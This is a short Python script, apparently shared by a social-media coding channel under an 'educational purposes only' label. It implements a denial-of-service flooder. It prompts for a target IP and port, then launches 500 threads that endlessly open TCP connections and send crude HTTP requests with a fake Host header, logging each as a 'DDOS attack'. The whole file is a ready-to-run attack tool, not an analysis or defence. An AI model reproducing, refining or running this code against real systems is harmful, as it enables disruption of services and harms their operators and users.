# Spartan Codes | YT: @SpartanMilos | IG: @spartan.codes/@milos.spartan [FOR EDUCATIONAL PURPOSES ONLY]
import socket
import threading

# pip install rich
from rich.console import Console
from rich.theme import Theme

custom_theme = Theme({"info": "bold cyan", "warning": "magenta", "danger": "bold red"})
console = Console(theme=custom_theme)

target = console.input("[bold cyan]Enter target IP[/bold cyan] [bold red]>[/bold red] ")
port = int(
    console.input("[bold cyan]Enter target port[/bold cyan] [bold red]>[/bold red] ")
)
fake_ip = "182.68.20.32"

payload_num = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target, port))

        global payload_num
        payload_num += 1
        console.log(
            f"[{payload_num}] :skull: SPARTAN_DDOS_ATTACK :skull:", style="danger"
        )

        s.close()


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
